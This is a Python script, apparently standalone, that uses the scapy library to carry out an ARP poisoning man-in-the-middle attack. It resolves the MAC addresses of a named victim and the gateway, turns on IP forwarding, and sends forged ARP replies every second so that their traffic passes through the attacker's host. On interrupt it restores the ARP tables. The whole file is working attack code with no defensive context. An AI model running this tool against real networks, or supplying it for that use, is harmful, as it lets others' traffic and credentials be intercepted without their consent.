import argparse
import signal
import sys
import logging
import time

from scapy.layers.l2 import *
from scapy.sendrecv import send


def get_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        mac = r[Ether].src
        if mac is None:
            sys.exit("ERROR: Could not find MAC address for IP: %d. Closing...." % ip)
        return mac


def poison_network(gateway_ip, victim_ip, gateway_mac, victim_mac):
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))


def fix_network(gateway_ip, victim_ip, gateway_mac, victim_mac):
    logging.warn("Fixing network...")
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)
    sys.exit("Bye..")


def main(args):
    if os.geteuid() != 0:
        sys.exit("ERROR: Please run as root")
    gateway_ip = args.gateway_ip
    victim_ip = args.victim_ip
    gateway_mac = get_mac(args.gateway_ip)
    victim_mac = get_mac(args.victim_ip)
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ip_forward:
        ip_forward.write('1\n')

    def on_interrupt(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ip_forward:
            ip_forward.write('0\n')
        fix_network(gateway_ip, victim_ip, gateway_mac, victim_mac)

    signal.signal(signal.SIGINT, on_interrupt)
    logging.warn("Starting ARP poison attack...")
    while True:
        poison_network(gateway_ip, victim_ip, gateway_mac, victim_mac)
        time.sleep(1)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim_ip", dest="victim_ip")
    parser.add_argument("-g", "--gateway_ip", dest="gateway_ip")
    return parser.parse_args()


if __name__ == "__main__":
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    main(parse_args())

